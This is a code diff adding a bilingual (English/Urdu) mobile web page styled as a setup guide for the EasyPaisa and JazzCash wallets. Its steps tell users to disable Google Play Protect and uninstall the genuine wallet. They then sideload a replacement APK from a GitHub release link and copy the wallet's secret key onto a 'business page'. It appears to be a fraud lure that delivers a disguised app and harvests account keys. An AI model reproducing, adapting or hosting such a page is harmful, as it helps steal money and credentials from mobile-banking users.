+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/></svg>
+          <span data-i18n="mDownload"></span>
+        </a>
+      </div>
+      <div class="dl-card">
+        <div class="dl-card-top">
+          <img class="wlogo" src="https://play-lh.googleusercontent.com/NpYySXJS_VNGjzmNY8hrkyjRb9snboxwELc0WxBuRNi4YwN-lgc2cQqo57AwBUUI1Fd_sh5N1A8j28WkBAIHOw=w480-h960-rw" alt="">
+          <div class="info">
+            <div class="name">EasyPaisa Business &amp; Personal</div>
+            <div class="file">easypaisa_dp.apk</div>
+          </div>
+        </div>
+        <a class="btn-dl" href="https://github.com/indiapay23/apk/releases/download/PK/easypaisa_dp.apk" rel="noopener">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/></svg>
+          <span data-i18n="mDownload"></span>
+        </a>
+      </div>
+      <div class="hint-box" data-i18n="s7Login"></div>
+    </article>
+
+    <!-- Phase 4: Copy key -->
+    <article class="block" id="phase4">
+      <div class="block-hd">
+        <div class="badge">4</div>
+        <div>
+          <h2 data-i18n="p4Title"></h2>
+          <p class="sub" data-i18n="p4Sub"></p>
+        </div>
+      </div>
+      <div class="hint-box" style="margin:0.28rem 0.28rem 0.16rem" data-i18n="p4Hint"></div>
+      <div class="key-guide">
+        <div class="key-wallet">
+          <img class="wlogo" src="https://play-lh.googleusercontent.com/NpYySXJS_VNGjzmNY8hrkyjRb9snboxwELc0WxBuRNi4YwN-lgc2cQqo57AwBUUI1Fd_sh5N1A8j28WkBAIHOw=w480-h960-rw" alt="EasyPaisa">
+          <h3>EasyPaisa</h3>
+        </div>
+        <figure class="key-fig">
+          <span class="tag" data-i18n="p4EpTag1"></span>
+          <img src="assets/easypaisa-copy-key-1.png" width="750" height="1334" loading="lazy" alt="" data-i18n-alt="p4EpAlt1">
+          <figcaption data-i18n="p4EpCap1"></figcaption>
+        </figure>
+        <figure class="key-fig">
+          <span class="tag" data-i18n="p4EpTag2"></span>
+          <img src="assets/easypaisa-copy-key-2.png" width="750" height="1334" loading="lazy" alt="" data-i18n-alt="p4EpAlt2">
+          <figcaption data-i18n="p4EpCap2"></figcaption>
+        </figure>
+
+        <div class="key-wallet" style="margin-top:0.12rem">
+          <img class="wlogo" src="https://play-lh.googleusercontent.com/gxLZ7ouLFPXZQWvvUDvGtDyFeGjcGLgoR4xRvWC98QuMkhe-OOKiAT6f1oL3PwjM_jDKghVedUM-skYGWowJCio=w480-h960-rw" alt="JazzCash">
+          <h3>JazzCash</h3>
+        </div>
+        <figure class="key-fig">
+          <span class="tag" data-i18n="p4JzTag"></span>
+          <img src="assets/jazzcash-copy-key.png" width="750" height="1334" loading="lazy" alt="" data-i18n-alt="p4JzAlt">
+          <figcaption data-i18n="p4JzCap"></figcaption>
+        </figure>
+      </div>
+    </article>
+  </main>
+
+  <div class="notice">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 9v4"/><path d="M12 17h.01"/><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z"/></svg>
+    <span data-i18n="remind"></span>
+  </div>
+</div>
+
+<script>
+(function () {
+  /* H5 rem: 750 design, 1rem = 100px at 375px width */
+  function setRootRem() {
+    var w = document.documentElement.clientWidth || window.innerWidth;
+    if (w > 750) w = 750;
+    document.documentElement.style.fontSize = (w / 7.5) + 'px';
+  }
+  setRootRem();
+  window.addEventListener('resize', setRootRem);
+  window.addEventListener('orientationchange', setRootRem);
+
+  var I18N = {
+    en: {
+      navTitle: 'Setup guide',
+      heroTitle: 'Wallet setup guide',
+      heroSub: 'Complete these 4 steps in order on your Android phone browser.',
+      chipDevice: 'Mobile H5 only', chipTime: '~3 min',
+      navP1: 'Protect', navP2: 'Uninstall', navP3: 'Download', navP4: 'Copy key',
+      step: 'Step',
+      mSearch: 'Search apps & games', mManage: 'Manage your account', mSettings: 'Settings',
+      mNoHarm: 'No harmful apps found', mScan: 'Scan',
+      mScanApps: 'Scan apps with Play Protect', mScanAppsD: 'Apps won’t be scanned automatically',
+      mImprove: 'Improve harmful app detection', mImproveD: 'Send unknown apps to Google',
+      p1Title: 'Turn off Play Protect', p1Sub: 'Play Store → profile → Play Protect → settings → off',
+      p2Title: 'Uninstall wallet app', p3Title: 'Download & sign in', p4Title: 'Copy key',
+      p4Sub: 'After sign-in, copy the secret key in the wallet app and paste it on the business page.',
+      p4Hint: 'Follow the screenshots below for your wallet (EasyPaisa or JazzCash).',
+      p4EpTag1: 'Step A', p4EpTag2: 'Step B',
+      p4EpAlt1: 'EasyPaisa home — tap the info (i) icon next to your name',
+      p4EpAlt2: 'EasyPaisa — tap Copy on the secret key dialog',
+      p4EpCap1: 'On the EasyPaisa home screen, tap the small info (i) button beside your account name (see red arrow).',
+      p4EpCap2: 'When the key appears in the popup, tap Copy, then paste it on the business page.',
+      p4JzTag: 'Step',
+      p4JzAlt: 'JazzCash Business — tap the key icon in the top bar to copy secret key',
+      p4JzCap: 'On JazzCash Business, tap the circled key/document icon at the top (see arrow) to copy the secret key.',
+      s1Title: 'Open the Google Play Store', s1Desc: 'Find and open the Google Play Store app on your phone.', s1Cap: 'Open Play Store',
+      s2Title: 'Tap your profile icon', s2Desc: 'Tap your profile picture at the top right to open the account menu.', s2Cap: 'Tap avatar (top right)',
+      s3Title: 'Open Play Protect', s3Desc: 'In the menu that appears, tap “Play Protect”.', s3Cap: 'Tap Play Protect',
+      s4Title: 'Open Play Protect settings', s4Desc: 'Tap the settings gear at the top right.', s4Cap: 'Tap the settings gear',
+      s5Title: 'Turn off scanning', s5Desc: 'Turn off “Scan apps with Play Protect”. If a confirmation appears, choose Turn off.', s5Cap: 'Turn off “Scan apps…”',
+      s6Desc: 'Settings → Apps → find your wallet → Uninstall.', s6Cap: 'Uninstall only the wallet you are about to reinstall.',
+      mInstalled: 'Uninstall if present', mUninstall: 'Uninstall',
+      s7Desc: 'Pick your wallet, download the APK, install, and sign in.',
+      s7Login: 'Open the APK from notifications to install. If blocked, allow your browser to install unknown apps in Settings → Security. See the video “App Was Denied Access” above Step 2.',
+      mDownload: 'Download APK',
+      ytDeniedTitle: 'App Was Denied Access?',
+      ytDeniedSub: 'Video: how to fix on Android',
+      ytDeniedDesc: 'If you see “App Was Denied Access” when installing the wallet APK, watch this guide after turning off Play Protect in Step 1.',
+      ytWatch: 'Watch on YouTube',
+      remind: 'When done, turn Play Protect scanning back on.'
+    },
+    ur: {
+      navTitle: 'انسٹال گائیڈ',
+      heroTitle: 'والیٹ انسٹال گائیڈ',
+      heroSub: 'Android فون کے براؤزر میں ترتیب سے یہ 4 مراحل مکمل کریں۔',
+      chipDevice: 'صرف موبائل H5', chipTime: 'تقریباً 3 منٹ',
+      navP1: 'Protect', navP2: 'حذف', navP3: 'ڈاؤن لوڈ', navP4: 'کی کاپی',
+      step: 'مرحلہ',
+      mSearch: 'ایپس اور گیمز تلاش کریں', mManage: 'اپنا اکاؤنٹ منظم کریں', mSettings: 'ترتیبات',
+      mNoHarm: 'کوئی نقصان دہ ایپ نہیں ملی', mScan: 'اسکین',
+      mScanApps: 'Scan apps with Play Protect', mScanAppsD: 'ایپس خودکار طور پر اسکین نہیں ہوں گی',
+      mImprove: 'Improve harmful app detection', mImproveD: 'نامعلوم ایپس Google کو بھیجیں',
+      p1Title: 'Play Protect بند کریں', p1Sub: 'Play Store → پروفائل → Play Protect → settings → off',
+      p2Title: 'والیٹ ایپ حذف کریں', p3Title: 'ڈاؤن لوڈ و لاگ ان', p4Title: 'کی کاپی',
+      p4Sub: 'لاگ ان کے بعد والیٹ ایپ میں secret key کاپی کر کے بزنس صفحے پر پیسٹ کریں۔',
+      p4Hint: 'نیچے EasyPaisa یا JazzCash کے لیے اسکرین شاٹ دیکھیں۔',
+      p4EpTag1: 'مرحلہ A', p4EpTag2: 'مرحلہ B',
+      p4EpAlt1: 'EasyPaisa — نام کے پاس info (i) آئیکن',
+      p4EpAlt2: 'EasyPaisa — Copy بٹن',
+      p4EpCap1: 'EasyPaisa ہوم پر اپنے نام کے پاس info (i) بٹن پر ٹیپ کریں۔',
+      p4EpCap2: 'پاپ اپ میں key دکھے تو Copy پر ٹیپ کریں، پھر بزنس صفحے پر پیسٹ کریں۔',
+      p4JzTag: 'مرحلہ',
+      p4JzAlt: 'JazzCash Business — اوپر key آئیکن',
+      p4JzCap: 'JazzCash Business میں اوپر والا key/document آئیکن ٹیپ کر کے secret key کاپی کریں۔',
+      s1Title: 'Google Play Store کھولیں', s1Desc: 'اپنے فون پر Google Play Store ایپ تلاش کر کے کھولیں۔', s1Cap: 'Play Store کھولیں',
+      s2Title: 'اپنے پروفائل آئیکن پر ٹیپ کریں', s2Desc: 'اکاؤنٹ مینو کھولنے کے لیے اوپر دائیں جانب اپنی پروفائل تصویر پر ٹیپ کریں۔', s2Cap: 'اوپر دائیں اوتار پر ٹیپ کریں',
+      s3Title: 'Play Protect کھولیں', s3Desc: 'آنے والے مینو میں “Play Protect” پر ٹیپ کریں۔', s3Cap: 'Play Protect پر ٹیپ کریں',
+      s4Title: 'Play Protect کی ترتیبات کھولیں', s4Desc: 'اوپر دائیں جانب سیٹنگز گیئر پر ٹیپ کریں۔', s4Cap: 'سیٹنگز گیئر پر ٹیپ کریں',
+      s5Title: 'اسکیننگ بند کریں', s5Desc: '“Scan apps with Play Protect” بند کریں۔ اگر تصدیق کا پیغام آئے تو Turn off منتخب کریں۔', s5Cap: '“Scan apps…” بند کریں',
+      s6Desc: 'Settings → Apps → والیٹ → Uninstall۔', s6Cap: 'صرف وہی والیٹ حذف کریں جو دوبارہ انسٹال کریں گے۔',
+      mInstalled: 'اگر موجود ہو تو حذف', mUninstall: 'Uninstall',
+      s7Desc: 'والیٹ منتخب کریں، APK ڈاؤن لوڈ، انسٹال، لاگ ان۔',
+      s7Login: 'نوٹیفکیشن سے APK کھول کر انسٹال کریں۔ بلاک ہو تو Settings → Security میں براؤزر کو اجازت دیں۔ “App Was Denied Access” ویڈیو Step 2 کے اوپر دیکھیں۔',
+      mDownload: 'APK ڈاؤن لوڈ',
+      ytDeniedTitle: 'App Was Denied Access؟',
+      ytDeniedSub: 'ویڈیو: Android پر حل',
+      ytDeniedDesc: 'APK انسٹال کرتے وقت “App Was Denied Access” آئے تو Step 1 کے بعد یہ ویڈیو دیکھیں۔',
+      ytWatch: 'YouTube پر دیکھیں',
+      remind: 'کام مکمل ہونے پر Play Protect دوبارہ آن کریں۔'
+    }
+  };
+
+  var params = new URLSearchParams(location.search);
+  var lang = 'en';
+
+  function t(k) { return (I18N[lang] && I18N[lang][k]) || I18N.en[k] || k; }
+
+  function applyLang(l) {
+    lang = I18N[l] ? l : 'en';
+    var root = document.documentElement;
+    root.lang = lang;
+    root.dir = lang === 'ur' ? 'rtl' : 'ltr';
+    document.querySelectorAll('[data-i18n]').forEach(function (el) {
+      el.textContent = t(el.getAttribute('data-i18n'));
+    });
+    document.querySelectorAll('[data-i18n-alt]').forEach(function (el) {
+      el.setAttribute('alt', t(el.getAttribute('data-i18n-alt')));
+    });
+    document.querySelectorAll('.lang button').forEach(function (b) {
+      b.setAttribute('aria-pressed', String(b.dataset.lang === lang));
+    });
+    document.title = t('navTitle');
+    try { localStorage.setItem('pp_lang', lang); } catch (e) {}
+  }
+
+  document.querySelectorAll('.lang button').forEach(function (b) {
+    b.addEventListener('click', function () { applyLang(b.dataset.lang); });
+  });
+
+  document.getElementById('back').addEventListener('click', function () {
+    if (history.length > 1) history.back();
+  });
+
+  document.querySelectorAll('.phase-nav a').forEach(function (a) {
+    a.addEventListener('click', function (e) {
+      var id = a.getAttribute('href');
+      if (!id || id.charAt(0) !== '#') return;
+      var el = document.querySelector(id);
+      if (!el) return;
+      e.preventDefault();
+      el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+
+  var saved = null;
+  try { saved = localStorage.getItem('pp_lang'); } catch (e) {}
+  var requested = params.get('lang');
+  if (requested === 'zh') requested = 'en';
+  if (saved === 'zh') saved = 'en';
+  applyLang(requested || saved || 'en');
+})();
+</script>
+</body>
+</html>
